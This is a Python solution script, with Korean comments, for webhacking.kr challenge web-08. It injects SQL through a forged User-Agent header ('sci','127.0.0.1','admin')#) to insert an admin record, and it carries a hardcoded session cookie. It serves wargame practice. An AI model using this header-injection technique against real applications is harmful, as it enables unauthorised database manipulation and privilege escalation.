#http://webhacking.kr/challenge/web/web-08/
'''
---설명---
agent: User-Agent / ip: 접속IP / id: GUEST 로 insert되고 있음
소스코드를 보면 User-Agent 값에 db접근 필터링은 되고 있으나 기본 ' , # 기호는 없음
따라서 User-Agent 값을 변조하여 agent, ip, id:admin으로 insert 성공 후 접속시도
'''
import urllib.request

phpsessid='805defb40aabf56fc3bdc3336a183499'

header = "sci','127.0.0.1', 'admin')#" #기호는 php에서 주석 처리
url = 'http://webhacking.kr/challenge/web/web-08'
req=urllib.request.Request(url)

# 2.URL헤더를 수정
req.add_header('User-Agent', header)
req.add_header('Cookie',"PHPSESSID=%s" %(phpsessid))
html=urllib.request.urlopen(req).read().decode()
print(html)

header='sci'
req.add_header('User-Agent', header)
req.add_header('Cookie',"PHPSESSID=%s" %(phpsessid))
html=urllib.request.urlopen(req).read().decode()
print(html)